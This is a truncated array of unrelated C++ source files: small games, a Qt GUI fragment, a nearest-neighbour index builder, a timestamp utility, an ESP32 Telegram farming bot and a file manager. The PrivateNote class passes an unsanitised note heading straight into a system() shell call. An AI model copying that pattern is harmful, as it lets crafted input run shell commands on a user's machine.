setModel(ads.afficher());\n\n  QTableView *tableView_temp = ui->stackedWidget_2->findChild<QTableView*>(\"tableView_temp\");\n  tableView_temp->setModel(A.afficher_temperature());\n\n  setFixedSize(1280, 720);\n  this -> setWindowIcon(QIcon(\":/Icons/Icons/Images/icon2.ico\"));\n  this -> setWindowTitle(\"Main Attentives\");\n  ui->stackedWidget->setCurrentIndex(0);\n  ui->stackedWidget_2->setCurrentIndex(2);\n\n  //**************************\n\n  // Gif generators\n  QMovie * gif_log = new QMovie(\":/Icons/Icons/Images/resetpwd.gif\");\n  QMovie * gif_profile = new QMovie(\":/Icons/Icons/Images/profile.gif\");\n\n  QLabel * gifform = ui -> stackedWidget_2 -> findChild < QLabel * > (\"label_22\");\n  QMovie * gif_form = new QMovie(\":/Icons/Icons/Images/form.gif\");\n\n  ui -> label_3 -> setMovie(gif_log);\n  ui -> profilepic -> setMovie(gif_profile);\n  gifform -> setMovie(gif_form);\n\n  gif_form -> start();\n  gif_log -> start();\n  gif_profile -> start();\n  //**************************\n\n  QLabel * error = ui -> stackedWidget -> findChild < QLabel * > (\"label_60\");\n  error -> hide();\n\n  QSettings settings(QSettings::IniFormat, QSettings::UserScope, QCoreApplication::organizationName(), QCoreApplication::applicationName());\n  ui -> axWidget -> dynamicCall(\"setProperty(const QString&, const QVariant&)\", \"Silent\", true);\n\n\n\n  QThread * serialThread = new QThread();\n   serialPtr -> moveToThread(serialThread);\n  QObject::connect(A.getserial(),SIGNAL(readyRead()),this,SLOT(update_label()));\n\n                   //  QSerialPort *serialPtr = A.getserial();\n                     if (!serialPtr) {\n                         qDebug() << \"Error: Unable to get a pointer to QSerialPort object\";\n                         return;\n                     }\n\n                     if (!serialPtr->isOpen()) {\n                         qDebug() << \"Error: Serial port is not open\";\n                         return;\n                     }\n\n                     QObject::connect(serialPtr, &QSerialPort::readyRead, [=]() {\n                         QByteArray da",
    "# include \"iGraphics.h\"\n# include \"struct.h\"\n\n//All variables\nint x = 3, y = 400;\nint a=20;\nint random=0;\n\n//All variables\n//Looping variables\nint i, j, l;\n\n//For Tom, Jerry and Spike\nint Tomfrontx=0, Tombackx=0;\nint Spikexmove=0, Spikeymove=0;\nint Spikefrontx=0, Jerrybackx=0;\n//Count for Pause and Resume\nint cnt=0;\nint start=0;\n//For obstacles\nint loxstart=421, obstaclexmove=0, uoxstart=631;\n//loxstart=lower obstacle x axis start, uoxstart=upper obstacle x axis start\n\n//For randomness of objects\n//int rl[10]={4, 1, -1, -2, 1, -1, -2, 1, -2, 1};\n//int ru[10]={0, 7, -2, -2, 2, -2, -2, 7, 1, 7};//Works more selectively to make the game harder\nint rl[10]={rand()%2, rand()%2, rand()%2, rand()%1, rand()%2, rand()%3, rand()%1, rand()%2, rand()%2, rand()%1};\nint ru[10]={rand()%7, rand()%7, rand()%5, rand()%4, rand()%3, rand()%5, rand()%7, rand()%3, rand()%1, rand()%6};\n//For obstacles\nint lofirstx, losecondx;\nint uofirstx, uosecondx;\nint lobsrand, uobsrand;//For randomness of obstacles\n//Third obstacle\nint toxstart=400, tobsrand;\nint tobsrandmultiply;\nint tofirstx, tosecondx;\n//int r3[10]={0, 7, -2, -2, 2, -2, -2, 7, 1, 7};\nint r3[10]={rand()%8, rand()%8, rand()%8, rand()%8, rand()%8, rand()%8, rand()%8, rand()%8, rand()%8, rand()%8};\n//For Tom Tripping\nint trip=0;\nint spikein=0, spikeout=0;\nint tripcount=0;\n//Variable difference\nint vardiff=0;\n//Not going up or down while in pause\nint notpause=0;\n//Timer variables\n//Rawtime..\nint H, M, S, c;\n//Counttime\nint h=0, m=0, s=0;\n//For booster\nint bfirstx, bsecondx;\nint rb[10]={-20, 17, 10, 18, 10, 15, 27, 12, 15,17};\nint brand;\nint bstore[50];\nchar coin[8][15]={\"Coins_1.bmp\", \"Coins_2.bmp\", \"Coins_3.bmp\", \"Coins_4.bmp\", \"Coins_5.bmp\", \"Coins_6.bmp\", \"Coins_7.bmp\", \"Coins_8.bmp\"};\nint coinindex=0;\n//For galleons\nint silfirstx, silsecondx;\nint silverstore[50];\nint silrand;\nint silcoinindex=0;\n//Coin collection->//Spike.speed\nint coinage=0;\n//Game navigation\nint countofs=0;\n//Menu navigation\nint menu=1;\nint menulimit=4;\n//Settings navigation\nint settingspage=0;\nint settings=2;\n//Instruction navigation\nint inst=1;\n//Tom jumping\nint jump=0;\n//For mid placing\nint previous=0, mid;\n//For sound and level settings\nint sound=0;\nint level=1;\n//For resume page\nint resume=1;\nint resumepage=0;\n//For 3 lifes of Tom\nint life=3;\nint lifestate=0;\n//Variables for Levels\nfloat Spikespeed=1;\nint obstaclespeed=3;\n//Jerry waving\nint jerrywave=0;\nchar jwave[2][15]={\"wave1.bmp\", \"wave2.bmp\"};\nint jwaveindex=0;\n//Spike can or cannot catch Tom\nint spikecancatch=1;\nint spikejumprange=5;\n//High Score Variables\nint score;\nint Highscore;\n//Display variables\nchar timestr[80], coinstr[80], scorestr[80];\nchar finalscorestr[80], highscorestr[80];\n//For new game after spike catches Tom\nint newgame=0;\n//For more page\nint moremenu=1;\n\n//Structured objects*********\nwhisker Tom, Jerry;\nobj wall, b, sil;//wall, coin and galleons\n\n\n//Function Prototypes\nvoid scorestore(int score);\nint GetHighScore();\nvoid reset(void);\n\n//For Levels\n//Start values\n/*\n1.Intro page->start=0\n2.Home page->start=1->Instruction(2), Quit game(->0), Settings(3)->Sound on/off, Level(Optional)\n3.Game page->start=2;\n4.Settings->start=4;\n5.Game over->win->start=5;\n              lose->start=6;\n5.Instruction page->start=7;\n6.Resume page->start=8;\n7.More page->start=9;\n8.Best figures->start=10;\n9.Credits->start=11;\n10.Features->start=12;\n*/\n\n/*\nFeatures of whiskers\n/Game start\n1. Press s to proceed to game\n2. Press space to resume/pause\n3. Try to catch jerry\n/Obstacles\n4. Obstacles positions are random\n5. Right click to avoid lower obstacles\n   Left  click to avoid upper obstacles\n6. Right/Left click gets Tom 5 pix back\n/Tripping\n7. No tripping within 100 on either side\n8. No spike comes in within 250 for tripping\n   but jerry advances by 10\n9. Spike comes in for tripping after 250\n   and moves by itself\n10. Every tripping gets tom 50 pix back\n/Spike\n11.Avoid Spike catching Tom\n12.Spike chases Tom up to 600 and then retreats\n13.Avoids obstacles by itself\n/Jerry\n14.Goes at constant speed\n/Looping\n15.Tom comes back to zero after 1180\n   idea is to shift the camera\n16.Jerry after looping\n   a.Restarts at 100 if final difference<300\n   b.Restarts at 200 if final difference>300\n17.Spike restarts from Neg x and continues to\n   chase Tom\n/Booster\n18.Tom gets booster once in a while\n19.Booster positions are random\n20.Booster vanishes after use\n*/\n\n\n//iDraw Function start\nvoid iDraw()\n{\n    //Initiating Drawing code\n    iClear();\n\n    //*****************************\n    //First intro page\n    if(start == 0)\n    {\n        iShowBMP(450,100,\"Intro.bmp\");\n        iPauseTimer(0);\n    }\n\n    //******************************\n    //Menu page\n    //Selecting Start game/ New game\n    if(start==1 && menu==1)\n    {\n        iShowBMP(0, 0, \"bg1.bmp\");\n        if(resumepage==0)\n        {\n            iShowBMP(30, 400, \"Start_game_2.bmp\");\n        }\n        if(resumepage==1)\n        {\n            iShowBMP(30, 400, \"New_game_2.bmp\");\n        }\n        iShowBMP(30, 340, \"",
    "#include <gtest/gtest.h>\n#include <omp.h>\n\n#include <algorithm>\n#include <boost/dynamic_bitset.hpp>\n#include <boost/program_options.hpp>\n#include <chrono>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\n#include \"efanna2e/distance.h\"\n#include \"efanna2e/neighbor.h\"\n#include \"efanna2e/parameters.h\"\n#include \"efanna2e/util.h\"\n#include \"index_bipartite.h\"\n\nnamespace po = boost::program_options;\n\nint main(int argc, char **argv) {\n    std::string base_data_file;\n    std::string sampled_query_data_file;\n    // std::string query_data_file;\n    std::string bipartite_index_save_file, projection_index_save_file, learn_base_nn_file, base_learn_nn_file;\n    std::string data_type;\n    std::string dist;\n    uint32_t M_bp, M_sq;\n    uint32_t M_pjbp, L_pjpq;\n    uint32_t L_pq;\n    uint32_t num_threads;\n\n    po::options_description desc{\"Arguments\"};\n    try {\n        desc.add_options()(\"help,h\", \"Print information on arguments\");\n        desc.add_options()(\"data_type\", po::value<std::string>(&data_type)->required(), \"data type <int8/uint8/float>\");\n        desc.add_options()(\"dist\", po::value<std::string>(&dist)->required(), \"distance function <l2/ip>\");\n        desc.add_options()(\"base_data_path\", po::value<std::string>(&base_data_file)->required(),\n                           \"Input data file in bin format\");\n        desc.add_options()(\"sampled_query_data_path\", po::value<std::string>(&sampled_query_data_file)->required(),\n                           \"Sampled query file in bin format\");\n        // desc.add_options()(\"query_data_path\",\n        //                    po::value<std::string>(&query_data_file)->required(),\n        //                    \"Query file in bin format\");\n        desc.add_options()(\"bipartite_index_save_path\", po::value<std::string>(&bipartite_index_save_file)->required(),\n                           \"Path prefix for saving bipartite index file components\");\n        desc.add_options()(\"projection_index_save_path\",\n                           po::value<std::string>(&projection_index_save_file)->required(),\n                           \"Path prefix for saving projetion index file components\");\n        desc.add_options()(\"M_bp\", po::value<uint32_t>(&M_bp)->default_value(32),\n                           \"Number of neighbors for base points to build the bipartite graph\");\n        desc.add_options()(\"M_sq\", po::value<uint32_t>(&M_sq)->default_value(32),\n                           \"Number of neighbors for sampled query points to build the bipartite graph\");\n        desc.add_options()(\"M_pjbp\", po::value<uint32_t>(&M_pjbp)->default_value(32),\n                           \"Number of neighbors for projection graph\");\n        desc.add_options()(\"L_pjpq\", po::value<uint32_t>(&L_pjpq)->default_value(32),\n                           \"Priority queue length for projection graph searching\");\n        desc.add_options()(\"L_pq\", po::value<uint32_t>(&L_pq)->default_value(32),\n                           \"Priority queue length for searching\");\n        desc.add_options()(\"num_threads,T\", po::value<uint32_t>(&num_threads)->default_value(omp_get_num_procs()),\n                           \"Number of threads used for building index (defaults to \"\n                           \"omp_get_num_procs())\");\n        desc.add_options()(\"learn_base_nn_path\", po::value<std::string>(&learn_base_nn_file)->required(),\n                           \"Path of learn-base NN file\");\n        desc.add_options()(\"base_learn_nn_path\", po::value<std::string>(&base_learn_nn_file)->required(),\n                           \"Path of base-learn NN file\");\n\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, desc), vm);\n        if (vm.count(\"help\")) {\n            std::cout << desc;\n            return 0;\n        }\n        po::notify(vm);\n    } catch (const std::exception &ex) {\n        std::cerr << ex.what() << '\\n';\n        return -1;\n    }\n    std::cout << \"sampled query: \" << sampled_query_data_file << std::endl;\n    uint32_t base_num, base_dim, sq_num, sq_dim;\n    efanna2e::load_meta<float>(base_data_file.c_str(), base_num, base_dim);\n    efanna2e::load_meta<float>(sampled_query_data_file.c_str(), sq_num, sq_dim);\n    efanna2e::Metric dist_metric = efanna2e::INNER_PRODUCT;\n    if (dist == \"l2\") {\n        dist_metric = efanna2e::L2;\n        std::cout << \"Using l2 as distance metric\" << std::endl;\n    } else if (dist == \"ip\") {\n        dist_metric = efanna2e::INNER_PRODUCT;\n        std::cout << \"Using inner product as distance metric\" << std::endl;\n    } else if (dist == \"cosine\") {\n        dist_metric = efanna2e::COSINE;\n        std::cout << \"Using cosine as distance metric\" << std::endl;\n    } else {\n        std::cout << \"Unknown distance type: \" << dist << std::endl;\n        return -1;\n    }\n\n    float *data_bp = nullptr;\n    float *data_sq = nullptr;\n    float *aligned_data_bp = nullptr;\n    float *aligned_data_sq = nullptr;\n    efanna2e::Parameters parameters;\n    efanna2e::load_data<float>(base_da",
    "//A program that keeps track of the infected people around the world\r\n#include <iostream>\r\nusing namespace std;\r\nint main ()\r\n{\r\n\tint countries, infected;\r\n\tfloat sum, average;\r\n\r\n\t\r\n\tcout << \"This is a program that keeps track of the infected people around the world\" << endl << endl;\r\n\t\r\n\t\r\n\tcout << \"Enter the number of the countries: \"; // stores the number of countries (the number of times the loop will continue)\r\n\tcin >> countries;\r\n\t\r\n\t\t// create an array that stores each name of each country and the number of infected people in these countries\r\n\tstring array[countries];\r\n\tint arr[countries];\r\n\r\n\r\n\r\n\tfor (int i = 0; i < countries; i++)\r\n\t{\r\n\t\tcout << \"Enter name of country number \" << i + 1 << \" and the number of infected people in it: \";\r\n\t\tcin >> array[i];\r\n\t\tcin >> arr[i];\r\n\t\tcout << endl;\r\n\t\t\r\n    }\r\n\t\r\n\tcout << endl << endl;\r\n\r\n\r\n    // create a loop to be able to sum the total number of cases for all countries\r\n    for (int s = 0; s < countries; s++)\r\n    {\r\n    \tsum+=arr[s];\r\n\t}\r\n\tcout << \"The total number of infected cases for all countries is: \" << sum << endl;\r\n\t\r\n\t\r\n\t// get the average by dividing the sum of cases and the total number of values\r\n\taverage = sum/countries;\r\n\tcout << \"The average infections for all countries is: \" << average << endl;\r\n\t\r\n\tint max = arr[0];\r\n\t// create a loop to be able to find the highest number of infection\r\n    for(int m = 1; m < countries; m++)\r\n    {\r\n    \t\r\n\r\n       if(max < arr[m]) \r\n       {\r\n       \t  max = arr[m]; \r\n\t   }\r\n\r\n    }\r\n    cout << \"The highest number of infections is: \" << max; \r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#include \"PrivateNote.hpp\"\n#include <iostream>\n#include <fstream>\n#include <filesystem>\n\nusing namespace std;\nPrivateNote::PrivateNote(const string& heading, const string& content)\n    : Note (heading, content) {}\n\nvoid PrivateNote::edit(const string& heading) {\n    // Open the text file in the default text editor\n    string command = \"open notes/private/\" + heading + \".txt\"; // For macOS\n    cout << \"Opening file in text editor...\\n\";\n    int result = system(command.c_str());\n    \n    // Check if the system call was successful\n    if (result == -1) {\n        cout << \"Error: Failed to open text editor.\\n\";\n        return;\n    }\n    time(&modificationTimestamp);\n}\n\n\nvoid PrivateNote::display() const {\n    cout << \">>>>> Heading: \" << heading << endl;\n    // cout << \"Content:\\n\" << content << endl;\n    cout << \"Last Modified: \" << ctime(&modificationTimestamp) << endl;\n}\n\nvoid PrivateNote::save() const {\n    filesystem::create_directories(\"notes/private\"); // Ensure the directory exists\n    string filename = \"notes/private/\" + heading + \".txt\";\n    ofstream file(filename); // ofstream means output file stream\n    if (!file) {\n        cout << \"Error opening file for note: \" << heading << endl;\n        return;\n    }\n    file << \"Last Modified: \" << ctime(&modificationTimestamp);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fixerapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include<Windows.h>\n#include<time.h>\n#include<conio.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nusing namespace std;\nbool gameOver;\nconst int width = 60, hight = 30;//\u00e7\u00ec\u00b3\u00ed\u00ed\u00b3 \u00e4\u00eb\u00ff \u00b3\u00e3\u00f0\u00ee\u00e2\u00ee\u00e3\u00ee \u00ef\u00ee\u00eb\u00ff\nint x, y, score;\nenum eDirection { STOP = 0, LEFT, RIGHT, UP, DOWN, EXITT };\neDirection dir;\nchar arr[hight][width] = {};\nbool exit_t = false;\n\nint coin_1_x = 4;\nint coin_1_y = 7;\nbool coin_1 = true;\n\nint coin_2_x = 56;\nint coin_2_y = 3;\nbool coin_2 = true;\n\n\n\nint coin_3_x = 8;\nint coin_3_y = 24;\nbool coin_3 = true;\n\nint coin_4_x = 50;\nint coin_4_y = 27;\nbool coin_4 = true;\n\nint exit_1_y = 29;\nint exit_1_x = 57;\n\nint exit_2_y = 29;\nint exit_2_x = 58;\n\nint exit_3_y = 29;\nint exit_3_x = 56;\n\nint exit_4_y = 29;\nint exit_4_x = 55;\n\nvoid Setup() {\n    gameOver = false;\n    x = 1;\n    y = 1;\n    score = 0;\n\n    coin_1 = true;\n\n}\nvoid Draw() {\n    for (int i = 0; i < hight; i++) {\n        for (int j = 0; j < width; j++) {\n            if (i == 3 && j == 1 ||\n                i == 3 && j == 2 ||\n                i == 3 && j == 3 ||\n                i == 3 && j == 4 ||\n                i == 3 && j == 5 ||\n                i == 3 && j == 6 ||\n                i == 3 && j == 7 ||\n                i == 3 && j == 8 ||\n                i == 3 && j == 9 ||\n                i == 3 && j == 10 ||\n                i == 3 && j == 11 ||\n                i == 3 && j == 12 ||\n                i == 3 && j == 13 ||\n                i == 3 && j == 14 ||\n                i == 3 && j == 15 ||\n                i == 3 && j == 16 ||\n\n                i == 5 && j == 1 ||\n                i == 5 && j == 2 ||\n                i == 5 && j == 3 ||\n                i == 5 && j == 4 ||\n                i == 5 && j == 5 ||\n                i == 5 && j == 6 ||\n                i == 5 && j == 7 ||\n                i == 5 && j == 8 ||\n                i == 5 && j == 9 ||\n\n\n                i == 6 && j == 9 ||\n                i == 7 && j == 9 ||\n                i == 8 && j == 9 ||\n\n                i == 8 && j == 9 ||\n                i == 8 && j == 10 ||\n                i == 8 && j == 11 ||\n                i == 8 && j == 12 ||\n                i == 8 && j == 13 ||\n                i == 8 && j == 14 ||\n                i == 8 && j == 15 ||\n                i == 8 && j == 16 ||\n                i == 8 && j == 17 ||\n                i == 8 && j == 18 ||\n                i == 8 && j == 19 ||\n                i == 8 && j == 20 ||\n                i == 8 && j == 21 ||\n\n\n\n                i == 1 && j == 21 ||\n                i == 2 && j == 21 ||\n                i == 3 && j == 21 ||\n                i == 4 && j == 21 ||\n                i == 5 && j == 21 ||\n                i == 6 && j == 21 ||\n\n                i == 1 && j == 30 ||\n                i == 2 && j == 30 ||\n                i == 3 && j == 30 ||\n                i == 4 && j == 30 ||\n                i == 5 && j == 30 ||\n                i == 6 && j == 30 ||\n\n\n                i == 6 && j == 22 ||\n                i == 6 && j == 23 ||\n                i == 6 && j == 24 ||\n                i == 6 && j == 25 ||\n                i == 6 && j == 26 ||\n                i == 6 && j == 27 ||\n                i == 6 && j == 28 ||\n                i == 6 && j == 29 ||\n\n                i == 7 && j == 26 ||\n                i == 8 && j == 26 ||\n                i == 9 && j == 26 ||\n                i == 10 && j == 26 ||\n                i == 11 && j == 26 ||\n                i == 12 && j == 26 ||\n                i == 13 && j == 26 ||\n\n\n                i == 4 && j == 16 ||\n                i == 5 && j == 16 ||\n                i == 6 && j == 16 ||\n                i == 7 && j == 16 ||\n\n                i == 13 && j == 26 ||\n                i == 13 && j == 27 ||\n                i == 13 && j == 28 ||\n                i == 13 && j == 29 ||\n                i == 13 && j == 30 ||\n\n\n                i == 11 && j == 30 ||\n                i == 12 && j == 30 ||\n\n\n                i == 11 && j == 31 ||\n                i == 11 && j == 32 ||\n                i == 11 && j == 33 ||\n                i == 11 && j == 34 ||\n                i == 11 && j == 35 ||\n                i == 11 && j == 36 ||\n                i == 11 && j == 37 ||\n                i == 11 && j == 38 ||\n                i == 11 && j == 39 ||\n                i == 11 && j == 40 ||\n                i == 11 && j == 41 ||\n                i == 11 && j == 42 ||\n                i == 11 && j == 43 ||\n                i == 11 && j == 44 ||\n                i == 11 && j == 45 ||\n                i == 11 && j == 46 ||\n\n                i == 9 && j == 46 ||\n                i == 10 && j == 46 ||\n\n                i == 9 && j == 45 ||\n                i == 9 && j == 44 ||\n                i == 9 && j == 43 ||\n                i == 9 && j == 42 ||\n\n                i == 4 && j == 42 ||\n                i == 5 && j == 42 ||\n                i == 6 && j == 42 ||\n                i == 7 && j == 42 ||\n                i == 8 && j == 42 ||\n\n                i == 4 && j == 38 ||\n                i == 4 && j == 39 ||\n                i == 4 &",
    "/*\n * File: Timestamp.cpp\n * Author: Dorian Galvez-Lopez\n * Date: March 2009\n * Description: timestamping functions\n * \n * Note: in windows, this class has a 1ms resolution\n *\n * License: see the LICENSE.txt file\n *\n */\n\n#include <cstdio>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n#include <sstream>\n#include <iomanip>\n\n#ifdef _WIN32\n#ifndef WIN32\n#define WIN32\n#endif\n#endif\n\n#ifdef WIN32\n#include <sys/timeb.h>\n#define sprintf sprintf_s\n#else\n#include <sys/time.h>\n#endif\n\n#include \"Timestamp.h\"\n\nusing namespace std;\n\nusing namespace DUtils;\n\nTimestamp::Timestamp(Timestamp::tOptions option)\n{\n  if(option & CURRENT_TIME)\n    setToCurrentTime();\n  else if(option & ZERO)\n    setTime(0.);\n}\n\nTimestamp::~Timestamp(void)\n{\n}\n\nbool Timestamp::empty() const\n{\n  return m_secs == 0 && m_usecs == 0;\n}\n\nvoid Timestamp::setToCurrentTime(){\n\t\n#ifdef WIN32\n\tstruct __timeb32 timebuffer;\n\t_ftime32_s( &timebuffer ); // C4996\n\t// Note: _ftime is deprecated; consider using _ftime_s instead\n\tm_secs = timebuffer.time;\n\tm_usecs = timebuffer.millitm * 1000;\n#else\n\tstruct timeval now;\n\tgettimeofday(&now, NULL);\n\tm_secs = now.tv_sec;\n\tm_usecs = now.tv_usec;\n#endif\n\n}\n\nvoid Timestamp::setTime(const string &stime){\n\tstring::size_type p = stime.find('.');\n\tif(p == string::npos){\n\t\tm_secs = atol(stime.c_str());\n\t\tm_usecs = 0;\n\t}else{\n\t\tm_secs = atol(stime.substr(0, p).c_str());\n\t\t\n\t\tstring s_usecs = stime.substr(p+1, 6);\n\t\tm_usecs = atol(stime.substr(p+1).c_str());\n\t\tm_usecs *= (unsigned long)pow(10.0, double(6 - s_usecs.length()));\n\t}\n}\n\nvoid Timestamp::setTime(double s)\n{\n  m_secs = (unsigned long)s;\n  m_usecs = (s - (double)m_secs) * 1e6;\n}\n\ndouble Timestamp::getFloatTime() const {\n\treturn double(m_secs) + double(m_usecs)/1000000.0;\n}\n\nstring Timestamp::getStringTime() const {\n\tchar buf[32];\n\tsprintf(buf, \"%.6lf\", this->getFloatTime());\n\treturn string(buf);\n}\n\ndouble Timestamp::operator- (const Timestamp &t) const {\n\treturn this->getFloatTime() - t.getFloatTime();\n}\n\nTimestamp& Timestamp::operator+= (double s)\n{\n  *this = *this + s;\n  return *this;\n}\n\nTimestamp& Timestamp::operator-= (double s)\n{\n  *this = *this - s;\n  return *this;\n}\n\nTimestamp Timestamp::operator+ (double s) const\n{\n\tunsigned long secs = (long)floor(s);\n\tunsigned long usecs = (long)((s - (double)secs) * 1e6);\n\n  return this->plus(secs, usecs);\n}\n\nTimestamp Timestamp::plus(unsigned long secs, unsigned long usecs) const\n{\n  Timestamp t;\n\n\tconst unsigned long max = 1000000ul;\n\n\tif(m_usecs + usecs >= max)\n\t\tt.setTime(m_secs + secs + 1, m_usecs + usecs - max);\n\telse\n\t\tt.setTime(m_secs + secs, m_usecs + usecs);\n\t\n\treturn t;\n}\n\nTimestamp Timestamp::operator- (double s) const\n{\n\tunsigned long secs = (long)floor(s);\n\tunsigned long usecs = (long)((s - (double)secs) * 1e6);\n\n\treturn this->minus(secs, usecs);\n}\n\nTimestamp Timestamp::minus(unsigned long secs, unsigned long usecs) const\n{\n  Timestamp t;\n\n\tconst unsigned long max = 1000000ul;\n\n\tif(m_usecs < usecs)\n\t\tt.setTime(m_secs - secs - 1, max - (usecs - m_usecs));\n\telse\n\t\tt.setTime(m_secs - secs, m_usecs - usecs);\n\t\n\treturn t;\n}\n\nbool Timestamp::operator> (const Timestamp &t) const\n{\n\tif(m_secs > t.m_secs) return true;\n\telse if(m_secs == t.m_secs) return m_usecs > t.m_usecs;\n\telse return false;\n}\n\nbool Timestamp::operator>= (const Timestamp &t) const\n{\n\tif(m_secs > t.m_secs) return true;\n\telse if(m_secs == t.m_secs) return m_usecs >= t.m_usecs;\n\telse return false;\n}\n\nbool Timestamp::operator< (const Timestamp &t) const\n{\n\tif(m_secs < t.m_secs) return true;\n\telse if(m_secs == t.m_secs) return m_usecs < t.m_usecs;\n\telse return false;\n}\n\nbool Timestamp::operator<= (const Timestamp &t) const\n{\n\tif(m_secs < t.m_secs) return true;\n\telse if(m_secs == t.m_secs) return m_usecs <= t.m_usecs;\n\telse return false;\n}\n\nbool Timestamp::operator== (const Timestamp &t) const\n{\n\treturn(m_secs == t.m_secs && m_usecs == t.m_usecs);\n}\n\n\nstring Timestamp::Format(bool machine_friendly) const \n{\n  struct tm tm_time;\n\n  time_t t = (time_t)getFloatTime();\n\n#ifdef WIN32\n  localtime_s(&tm_time, &t);\n#else\n  localtime_r(&t, &tm_time);\n#endif\n  \n  char buffer[128];\n  \n  if(machine_friendly)\n  {\n    strftime(buffer, 128, \"%Y%m%d_%H%M%S\", &tm_time);\n  }\n  else\n  {\n    strftime(buffer, 128, \"%c\", &tm_time); // Thu Aug 23 14:55:02 2001\n  }\n  \n  return string(buffer);\n}\n\nstring Timestamp::Format(double s) {\n\tint days = int(s / (24. * 3600.0));\n\ts -= days * (24. * 3600.0);\n\tint hours = int(s / 3600.0);\n\ts -= hours * 3600;\n\tint minutes = int(s / 60.0);\n\ts -= minutes * 60;\n\tint seconds = int(s);\n\tint ms = int((s - seconds)*1e6);\n\n\tstringstream ss;\n\tss.fill('0');\n\tbool b;\n\tif((b = (days > 0))) ss << days << \"d \";\n\tif((b = (b || hours > 0))) ss << setw(2) << hours << \":\";\n\tif((b = (b || minutes > 0))) ss << setw(2) << minutes << \":\";\n\tif(b) ss << setw(2);\n\tss << seconds;\n\tif(!b) ss << \".\" << setw(6) << ms;\n\n\treturn ss.str();\n}\n\n\n",
    "#include <WiFi.h>\n#include <WiFiClientSecure.h>\n#include <UniversalTelegramBot.h>\n#include <ArduinoJson.h>\n#include <Wire.h>\n#include \"SparkFunBME280.h\"\n#include \"SoilMoistureSensor.h\"\n\n// Replace with your network credentials\nconst char* ssid = \"YourWiFiSSID\";\nconst char* password = \"YourWiFiPassword\";\n\n// Telegram Bot credentials and chat ID\nString BOTtoken = \"YourBotToken\";\nString chatId = \"YourChatID\";\n\nWiFiClientSecure clientTCP;\nUniversalTelegramBot bot(BOTtoken, clientTCP);\n\n// Soil Moisture Sensor\nSoilMoistureSensor soilSensor(A0);\n\n// BME280 Sensor\nBME280 bme;\n\nvoid setup() {\n  Serial.begin(115200);\n  delay(1000);\n\n  // Initialize WiFi\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(ssid, password);\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(500);\n    Serial.println(\"Connecting to WiFi...\");\n  }\n\n  // Initialize BME280 sensor\n  Wire.begin();\n  if (!bme.begin()) {\n    Serial.println(\"Could not find BME280 sensor, check wiring!\");\n    while (1);\n  }\n\n  // Initialize Telegram bot\n  bot.sendMessage(chatId, \"Smart Farming System started!\", \"\");\n\n  // Initialize Soil Moisture Sensor\n  soilSensor.begin();\n}\n\nvoid loop() {\n  // Check soil moisture level\n  int soilMoisture = soilSensor.getMoisture();\n  if (soilMoisture < 30) { // Adjust threshold based on your needs\n    // Soil moisture is low, trigger irrigation system\n    // Code to control irrigation system goes here\n    bot.sendMessage(chatId, \"Soil moisture level is low, irrigating...\", \"\");\n    delay(5000); // Simulate irrigation delay\n  }\n\n  // Read environmental data from BME280 sensor\n  float temperature = bme.readTempC();\n  float humidity = bme.readFloatHumidity();\n  float pressure = bme.readFloatPressure();\n\n  // Send environmental data to Telegram\n  String message = \"Temperature: \" + String(temperature) + \" \u00b0C\\n\";\n  message += \"Humidity: \" + String(humidity) + \" %\\n\";\n  message += \"Pressure: \" + String(pressure / 100.0) + \" hPa\";\n  bot.sendMessage(chatId, message, \"\");\n\n  // Wait for some time before next iteration\n  delay(60000); // Adjust delay based on your requirements\n}\n",
    "#include <iostream>\n#include <filesystem>\n#include <string>\n\nnamespace fs = std::filesystem;\n\nvoid listDirectory(const std::string& path) {\n    for (const auto& entry : fs::directory_iterator(path)) {\n        std::cout << entry.path().filename() << std::endl;\n    }\n}\n\nvoid createDirectory(const std::string& path) {\n    if (!fs::exists(path)) {\n        if (fs::create_directory(path)) {\n            std::cout << \"Directory created successfully.\\n\";\n        } else {\n            std::cerr << \"Error: Failed to create directory.\\n\";\n        }\n    } else {\n        std::cerr << \"Error: Directory already exists.\\n\";\n    }\n}\n\nvoid deleteFileOrDirectory(const std::string& path) {\n    if (fs::exists(path)) {\n        if (fs::is_directory(path)) {\n            if (fs::remove_all(path)) {\n                std::cout << \"Directory deleted successfully.\\n\";\n            } else {\n                std::cerr << \"Error: Failed to delete directory.\\n\";\n            }\n        } else {\n            if (fs::remove(path)) {\n                std::cout << \"File deleted successfully.\\n\";\n            } else {\n                std::cerr << \"Error: Failed to delete file.\\n\";\n            }\n        }\n    } else {\n        std::cerr << \"Error: File or directory does not exist.\\n\";\n    }\n}\n\nint main() {\n    std::string path;\n    char choice;\n\n    std::cout << \"Welcome to Simple File Manager\\n\";\n    std::cout << \"Enter directory path: \";\n    std::cin >> path;\n\n    do {\n        std::cout << \"\\nOptions:\\n\";\n        std::cout << \"1. List files and folders\\n\";\n        std::cout << \"2. Create directory\\n\";\n        std::cout << 